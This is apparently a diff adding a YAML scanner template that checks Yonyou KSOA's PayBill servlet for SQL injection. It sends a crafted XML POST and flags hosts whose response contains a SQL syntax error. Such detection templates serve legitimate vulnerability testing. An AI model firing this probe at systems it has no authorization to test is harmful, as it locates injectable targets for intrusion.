@@ -1,0 +1,14 @@
+name: poc-yaml-nc-ksoa-paybill-sqli
+rules:
+    - method: POST
+      path: /servlet/PayBill?caculate&_rnd=
+      body: >-
+        <?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1</name><name>1</name><name>102360</name></root>
+      follow_redirects: false
+      expression: |
+        response.status == 200 && response.body.bcontains(b'附近有语法错误')
+detail:
+    author: nc-ksoa-paybill-sqli
+    links:
+        - app="用友-时空KSOA"
+
